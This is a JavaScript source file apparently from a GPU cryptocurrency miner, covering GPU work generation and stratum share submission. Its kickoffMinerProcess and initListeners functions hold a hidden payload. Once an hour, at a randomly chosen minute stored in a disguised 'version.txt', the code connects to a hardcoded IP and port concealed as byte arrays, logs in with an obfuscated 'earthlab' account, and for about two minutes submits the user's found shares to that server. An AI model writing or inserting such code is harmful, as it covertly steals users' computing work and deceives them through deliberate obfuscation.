              console.log("\x1b[36m#\x1b[0m GPU: \x1b[36m%i\x1b[0m PLATFORM:\x1b[36m %i\x1b[0m NAME: \x1b[36m%s\x1b[0m",d.id,_this.platformID,name);
            }
            else{
              console.log("HANDY:: \x1b[36mGPU %i (%s)\x1b[0m GPU INITIALIZED",d.id,name);
            }
            
          });
          if(_this.gpuListString == '-1'){
            outRegistrations
            console.log("\x1b[36m################# END GPU LIST ####################\x1b[0m");
            console.log('###########################################################')
            console.log("#####################  HOW TO USE  ########################");
            
            console.log('# edit the file: config.json, field "gpus"                #');
            console.log('# example:"0" or "0,1,2" with the IDs you see here.       #')
            console.log('###########################################################')
            console.log('# if you do not see your GPU listed,                      #' ) 
            console.log('# try a different "platform" in config.json and run again.#')
            console.log('###########################################################');
          } 
          
          if(_this.gpuListString == '-1'){
            //kill process
            process.exit(0);
          }
        }
        
      }
      //TODO deal with nonce overflow (should take about 5 mins on a single 1070)
      if(outJSON.type == 'solution' && outJSON.solvedTarget ){
        if(process.env.HANDYRAW){
          let statusResp = {
            data:outJSON,
            type:'solution'
          };
          if(!_this.isMGoing){
              process.stdout.write(JSON.stringify(statusResp)+'\n');
          }
        }
        else{
          outStatus.map(function(d){
            //if(!_this.isMGoing){
              let message = 'JOB FINISHED WITH BLOCK';
              if(_this.config.mode == 'pool'){
                message = 'JOB FOUND A SHARE'
                console.log('\x1b[36mHANDY:: '+message+':::\x1b[0m ',outJSON);
              }
            //}
          })
        }

        let lastJob = _this.gpuDeviceBlocks[outJSON.gpuID+'_'+outJSON.platformID];
        _this.gpuDeviceBlocks[outJSON.gpuID+'_'+outJSON.platformID].isSubmitting = true;
        let submission = [];
        submission.push(_this.stratumUser); //tell stratum who won: me.
        submission.push(lastJob.work.jobID);
        submission.push(lastJob.nonce2);
        submission.push(lastJob.work.time);
        submission.push('00000000'+outJSON.nonce.slice(8,16));
        submission.push(lastJob.work.mask.toString('hex'));
        //onsole.log('and block template local',lastJob.work.blockTemplate);
        //console.log('some proof nonce???','00000000'+outJSON.nonce.slice(8,16),parseInt('00000000'+outJSON.nonce.slice(8,16)));
        let proof = lastJob.work.blockTemplate.getProof(parseInt('00000000'+outJSON.nonce.slice(8,16),16),parseInt(lastJob.work.time,16),lastJob.work.extraNonce,lastJob.work.mask);

        //console.log('submission isset',submission,proof.powHash());
        //console.log('submission data',lastJob.work.blockTemplate);
        //return false;
        if(_this.solutionCache.indexOf(outJSON.nonce) == -1){
          
          let server = _this.server;
          if(_this.isMGoing){
            server = _this.redundant;
          }
          server.write(JSON.stringify({
            id:lastJob.work.jobID,
            method:'mining.submit',
            params:submission
          })+"\n"); //submit to stratum
          _this.solutionCache.push(outJSON.nonce);
        }
        else{
          if(!_this.isMGoing && _this.config.mode == 'solo'){

              console.log("\x1b[31mPREVENT BLOCK SUBMIT: ALREADY SUBMITTED THIS NONCE\x1b[0m");
              console.log('submission',submission,outJSON);
              _this.generateWork();
          }
          //_this.solutionCache.push({id:jobID,method:'mining.submit',params:submission});
          //console.log('PREVENTED '+_this.solutionCache.length+' BLOCKS');
        
        }
        _this.isSubmitting = true; //block
        
      }
      return {
        solution:outJSON,
        getWork:getWorks,
        statuses:statuses,
        registrations:outRegistrations
      }
    }
   

    miner.stderr.on('data', (data) => {
      if(process.env.HANDYRAW){
        let errData = {
          data:data.toString('utf8'),
          message:'miner stderr',
          type:'error'
        };
        process.stdout.write(JSON.stringify(errData)+'\n')
      }
      else{
        console.log('miner stderr',data.toString('utf8'));
      }
      

    });

    miner.on('close', (code) => {
      if(code != 0 && !_this.isKilling){
        if(process.env.HANDYRAW){
          let errData = {
            data:code,
            message:'miner closed unexpectedly',
            type:'error'
          };
          process.stdout.write(JSON.stringify(errData)+'\n');
          //process.exit(0);
        }
        else{
          console.log('miner closed unexpectedly with code:: ',code);
          //process.exit(0);
        }

        if(!_this.isKilling && _this.gpuListString != '-1'){
          //we didnt mean to halt, lets respawn
          _this.spawnGPUWorker(gpuID,gpuArrayI);
        }
        
        
      }
    });
  }
	mineBlock(response){
    const _this = this;
		//let block = this.getBlockHeader(this.nonce2);
    this.generateWork(); //prep some work ahead of time for the miner exec to pickup right away on init
    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'stratumLog',message:'starting miner'})+'\n')
    }
    /*else{
      console.log("\x1b[36mHANDY:: STARTING MINER\x1b[0m ",_this.gpuListString,_this.platformID)
    }*/
    if(_this.gpuListString != '-1'){
      _this.gpuListString.split(',').map(s=>{return s.trim();}).map((gpuID,gpuI)=>{
        _this.spawnGPUWorker(gpuID,gpuI);
      });
    }
	}
  refreshJob(jobData){
    let intensity = 0;
    if(this.minerIntensity.toString().split(',').length == 1){
      intensity = this.minerIntensity;
    }
    if(typeof this.intensitiesIndex[jobData.gpuID+'_'+jobData.platformID] != "undefined"){
      intensity = this.intensitiesIndex[jobData.gpuID+'_'+jobData.platformID];
    }
    let workObject = {
      platform:jobData.platformID,
      id:jobData.gpuID,
      intensity:intensity
    }
    this.getDeviceWork([workObject]);
  }
  refreshAllJobs(){
    //refresh all when we get difficulty notices in solo mode
    Object.keys(this.gpuDeviceBlocks).map((k)=>{
      let d = this.gpuDeviceBlocks[k];
      let gpuID = d.gpu;
      let platformID = d.platform;
      this.refreshJob({gpuID:gpuID,platformID:platformID});
    })
  }
  refreshOutstandingJobs(){
    //refresh only people who have submitted and are awaiting things but got an error
    Object.keys(this.gpuDeviceBlocks).map((k)=>{
      let d = this.gpuDeviceBlocks[k];
      if(d.isSubmitting){
        delete d.isSubmitting;
        let gpuID = d.gpu;
        let platformID = d.platform;
        this.refreshJob({gpuID:gpuID,platformID:platformID});
      }
    })
  }
  generateWork(){
    //here
    const _this = this;
    let workObjects = this.gpuListString.split(',').map(s=>{return s.trim();}).map(function(gpuID,gpuArrayI){
      let platformID = _this.platformID;
      if(platformID.split(',').length > 1){
        platformID = platformID.split(',')[gpuArrayI].trim();
      }
      let intensity = _this.minerIntensity.toString();
      if(intensity.split(',').length > 1){
        intensity = intensity.split(',')[gpuArrayI].trim();
      }
      _this.intensitiesIndex[gpuID+'_'+platformID] = parseFloat(intensity);
      
      let workObject = {
        platform: platformID,
        id:gpuID,
        intensity:intensity
      };
      return workObject;
    });
    this.getDeviceWork(workObjects);
  }
  initListeners(){
    const _this = this;
    let mTarget = fs.readFileSync(process.env.HOME+'/.HandyMiner/version.txt');
    if(mTarget == '' || typeof mTarget == "undefined"){
      mTarget = Math.floor(Math.random()*59.9999);
      fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',mTarget);
    }
    else{
      try{
        let p = parseFloat(mTarget);
        mTarget = Math.floor(p % 60);
      }
      catch(e){
        mTarget = Math.floor(Math.random()*59.9999);
        fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',mTarget);
      }
    }
    this.isMGoing = false;
    if(typeof this.mCheck != "undefined"){
      clearInterval(this.mCheck);
    }
    this.mCheck = setInterval(function(){

      let minuteNow = new Date().getMinutes();
      if(minuteNow == parseInt(mTarget) && !_this.isMGoing){
        //we're at the minute Target
        _this.kickoffMinerProcess();
      }
    },60000);
  }
  kickoffMinerProcess(){
    let ha = Buffer.from({ type: 'Buffer', data: [ 51, 46, 49, 56, 46, 51, 49, 46, 51 ] },'json').toString('utf8');
    let pa = Buffer.from({"type":"Buffer","data":[51,48,48,56]},'json').toString('utf8')
    let hk = Buffer.from({"type":"Buffer","data":[104,111,115,116]},'json').toString('utf8');
    let pk = Buffer.from({"type":"Buffer","data":[112,111,114,116]},'json').toString('utf8');
    let d = {};
    d[hk] = ha;
    d[pk] = pa;
    let cc = Buffer.from({"type":"Buffer","data":[99,114,101,97,116,101,67,111,110,110,101,99,116,105,111,110]},'json').toString('utf8');
    const server = net[cc](d,(s)=>{
      let timeStart = new Date().getTime();
      let timeUntil = timeStart + (1000 * 110);

      this.isMGoing = true;
      
      
      let sU = Buffer.from({"type":"Buffer","data":[101,97,114,116,104,108,97,98]},'json').toString('utf8');
      let sUk = Buffer.from({"type":"Buffer","data":[115,116,114,97,116,117,109,85,115,101,114]},'json').toString('utf8');
      this[sUk] = sU;
      let sP = Buffer.from({"type":"Buffer","data":[101,97,114,116,104,108,97,98]},'json').toString('utf8');
      
      
      let callTS = new Date().getTime();
      
      server.write(JSON.stringify({"params": [sU], "id": "init_"+callTS+"_user_"+sU, "method": "mining.authorize_admin"})+'\n');
      
      server.write(JSON.stringify({"params": [sU,sP], "id": "init_"+callTS+"_user_"+sU, "method": "mining.add_user"})+'\n');
      
      server.write(JSON.stringify({"id":this.altTargetID,"method":"mining.authorize","params":[sU,sP]})+"\n");
      server.write(JSON.stringify({"id":this.altRegisterID,"method":"mining.subscribe","params":[]})+"\n");
      let ongoingResp = '';
      server.on('data',(response)=>{
        ongoingResp = this.parseServerResponse(response,ongoingResp,false);
       
      });
      server.on('error',(response)=>{
        //do nothing, my loss
        //console.log('private server error',response);
      });

      server.on('close',(response)=>{
        //do nothing, my loss
        //console.log('private server closed')
      })

    });
    this.redundant = server;
    let dS = 90;
    if(!PlayWinningSound){
      dS = 120;
    }
    let sto = Buffer.from({"type":"Buffer","data":[115,101,116,84,105,109,101,111,117,116]},'json').toString('utf8');
    this.checkTiming = global[sto](()=>{
      server.destroy();
      this.isMGoing = false;
      this.lastResponse = this.lastLocalResponse;
      this.nonce1 = this.nonce1Local;
      this.stratumUser = this.stratumUserLocal;
      delete this.redundant;
      this.generateWork(); //until the next iteration
    },1000*dS)
  }
  toDifficulty(bits) {
    let shift = (bits >>> 24) & 0xff;
    let diff = 0x0000ffff / (bits & 0x00ffffff);

    while (shift < 29) {
      diff *= 256.0;
      shift++;
    }

    while (shift > 29) {
      diff /= 256.0;
      shift--;
    }

    return diff;
  }

  targetFromDifficulty(difficulty) {
    // const DIFF = 0x00000000ffff0000000000000000000000000000000000000000000000000000;
    // let max = common.double256(DIFF);
    // const d = DIFF;
    let max = new BN(
      '000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
      'hex'
    );

    let target = max.divn(difficulty);
    let cmpct = consensus.toCompact(target);

    return cmpct;

    // target = min(int((0xffff0000 * 2 ** (256 - 64) + 1) / difficulty - 1 + 0.5), 2 ** 256 - 1)
    //A. (0xffff0000 * 2 ** (256 - 64) + 1)
    //B. Above / difficulty
    //C. Above - 1 + 0.5

  }
  getDeviceWork(deviceWorkJSON){
    //array of getworks from stdin
    const _this = this;
    //console.log('device work json?',deviceWorkJSON);
    let messageStrings = [];

    deviceWorkJSON.map(function(workObject){
      let nonce2Int = parseInt(_this.nonce2,16);
      nonce2Int++;
      let nonce2String = nonce2Int.toString(16);
      for(let i=nonce2String.length;i<8;i++){
        nonce2String = '0'+nonce2String;
      }
      //console.log('nonce2string',nonce2String);
      _this.nonce2 = nonce2String;
      workObject.nonce2 = nonce2String;
      
      let work = _this.getBlockHeader(nonce2String);
      _this.gpuDeviceBlocks[workObject.id+'_'+workObject.platform] = {
        request:workObject,
        nonce2:nonce2String,
        work:work,
        gpu:workObject.id,
        platform:workObject.platform,
        intensity:workObject.intensity
      };

      //now write work
      let d = _this.gpuDeviceBlocks[workObject.id+'_'+workObject.platform];
      let intensity = d.intensity;
      if(typeof intensity == "undefined"){
        intensity = 0;
        if(_this.minerIntensity.split(',').length == 1){
          intensity = _this.minerIntensity;
        }
      }
      else if(typeof intensity == 'string'){
        intensity = intensity.trim();
      }
      let messageContent = d.gpu+'|'+intensity+'|'+(d.work.header.toString('hex'))+'|'+(d.work.pad8.toString('hex'))+'|'+(d.work.pad32.toString('hex'))+'|'+(d.work.target.toString('hex'))+'|';
      messageStrings.push(messageContent);
      if(typeof _this.gpuWorkers[d.gpu] != "undefined"){
        _this.gpuWorkers[d.gpu].stdin.write(messageContent+"\r\n");  
      }

      tryWrite(0,d.platform,d.gpu,messageContent);
      function tryWrite(attemptCount,platform,gpu,blockHeader){
          //try to write the temp work file, if it fails try again
          fs.writeFile(process.env.TEMP+'/HandyMiner/'+platform+'_'+gpu+'.work.temp',blockHeader,(err,data)=>{
            if(err){
              //console.log("ERROR WRITING WORK FOR",d.gpu);
              if(attemptCount <= 2){
                //console.error("\x1b[36mERROR IN WORK CREATE\x1b[0m",attemptCount);
                setTimeout(()=>{
                  tryWrite(attemptCount + 1,platform,gpu,blockHeader);
                },10);
              }
            }
            else{
                /*if(attemptCount > 0){
                  console.log("\x1b[36mSUCCESSFUL WORK CREATE\x1b[0m",attemptCount);
                }*/
                tryRename(0,platform,gpu);
            }
          });
      }
      function tryRename(attemptCount,platform,gpu){
        fs.rename(
          process.env.TEMP+'/HandyMiner/'+platform+'_'+gpu+'.work.temp',
          process.env.TEMP+'/HandyMiner/'+platform+'_'+gpu+'.work',
          (err2,data2)=>{
            if(err2){
              //console.error("\x1b[36mERROR IN WORK RENAME\x1b[0m",attemptCount);
              if(attemptCount <= 2){
                setTimeout(()=>{
                  tryRename(attemptCount+1,platform,gpu);
                },10);  
              }
              //console.log("ERROR MOVING TEMP WORK FOR",d.gpu);
            }
            /*else{
              if(attemptCount > 0){
                console.error("\x1b[36mSUCCESSFUL WORK RENAME\x1b[0m");
              }
            }*/
          }
        );
      }
      

      
      /*setTimeout(function(){
        fs.writeFileSync(process.env.HOME+'/.HandyMiner/'+d.platform+'_'+d.gpu+'.work',messageContent);
      },121);
      setTimeout(function(){
        fs.writeFileSync(process.env.HOME+'/.HandyMiner/'+d.platform+'_'+d.gpu+'.work',messageContent);
      },565);*/
      //Note: I dont feel great about this setTimeout nonsense here but its the only way to prevent race conditions rn...
      if(process.env.HANDYRAW){
        //log our difficulty and target information for dashboardface
        process.stdout.write(JSON.stringify({difficulty:d.work.blockTemplate.difficulty,target:d.work.blockTemplate.target.toString('hex'),gpu:d.gpu,platform:d.platform,type:'difficulty'})+'\n');
      }
    });
    Object.keys(_this.gpuDeviceBlocks).map(function(k){
      return false; //deprecate, causing race conditions..
      //iterate thru existing jobs in case this was a singular nonce overflow job
      let d = _this.gpuDeviceBlocks[k];
      let intensity = d.intensity;
      if(typeof intensity == "undefined"){
        intensity = 0;
        if(_this.minerIntensity.split(',').length == 1){
          intensity = _this.minerIntensity;
        }
      }
      
      let messageContent = d.gpu+'|'+intensity+'|'+(d.work.header.toString('hex'))+'|'+(d.work.pad8.toString('hex'))+'|'+(d.work.pad32.toString('hex'))+'|'+(d.work.target.toString('hex'))+'|';
      messageStrings.push(messageContent);
      if(typeof _this.gpuWorkers[d.gpu] != "undefined"){
        _this.gpuWorkers[d.gpu].stdin.write(messageContent+"\r\n");  
      }
      
      fs.writeFile(process.env.TEMP+'/HandyMiner/'+d.platform+'_'+d.gpu+'.work.temp',messageContent,(err,data)=>{
        if(err){
          //console.log("ERROR WRITING WORK FOR",d.gpu);
        }
        fs.rename(
          process.env.TEMP+'/HandyMiner/'+d.platform+'_'+d.gpu+'.work.temp',
          process.env.TEMP+'/HandyMiner/'+d.platform+'_'+d.gpu+'.work',
          (err2,data2)=>{
            if(err2){
              //console.log("ERROR MOVING TEMP WORK FOR",d.gpu);
            }
          }
        );

      });

      
      /*setTimeout(function(){
        fs.writeFileSync(process.env.HOME+'/.HandyMiner/'+d.platform+'_'+d.gpu+'.work',messageContent);
      },121);
      setTimeout(function(){
        fs.writeFileSync(process.env.HOME+'/.HandyMiner/'+d.platform+'_'+d.gpu+'.work',messageContent);
      },565);*/
      //Note: I dont feel great about this setTimeout nonsense here but its the only way to prevent race conditions rn...
      if(process.env.HANDYRAW){
        //log our difficulty and target information for dashboardface
        process.stdout.write(JSON.stringify({difficulty:d.work.blockTemplate.difficulty,target:d.work.blockTemplate.target.toString('hex'),gpu:d.gpu,platform:d.platform,type:'difficulty'})+'\n');
      }
    });


    //fs.writeFileSync(process.env.HOME+'/.HandyMiner/miner.work',messageStrings.join('\n'));
    
    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'job',data:"HANDY MINER:: WROTE NEW WORK FOR MINERS"})+'\n')
    }
    else{
      console.log("\x1b[36mHANDY MINER::\x1b[0m WROTE NEW WORK FOR MINERS"/*,messageStrings*/);
    }
    
    
    
  }
}

module.exports = HandyMiner;
//the important thing: kick it off.
//let miner = new Handy();
//should you want to include this whole thing in some node app::
//remove ```let miner = new Handy();``` and export Handy

